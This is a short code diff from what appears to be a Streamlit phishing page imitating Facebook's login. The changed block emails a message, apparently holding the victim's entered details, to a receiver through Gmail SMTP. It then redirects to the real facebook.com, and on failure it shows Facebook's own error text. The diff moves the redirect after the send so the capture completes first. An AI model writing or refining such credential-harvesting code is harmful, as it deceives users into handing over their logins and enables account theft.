@@ -101,17 +101,16 @@ with col2:
                 msg["To"] = receiver
 
                 try:
-                    url = "https://www.facebook.com/"
-                    webbrowser.open(url)
                     server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                     server.login(sender, password)
                     server.send_message(msg)
                     server.quit()
+                    url = "https://www.facebook.com/"
+                    webbrowser.open(url)
                 except Exception as e:
                     st.error(f"❌ Failed to send email: {e}")
-
-        else:
-            st.error("The email address or mobile number you entered isn't connected to an account.")
+                    st.error("The email address or mobile number you entered isn't connected to an account.")
+            
 
 
     st.markdown("[forgetten password?](https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0)")
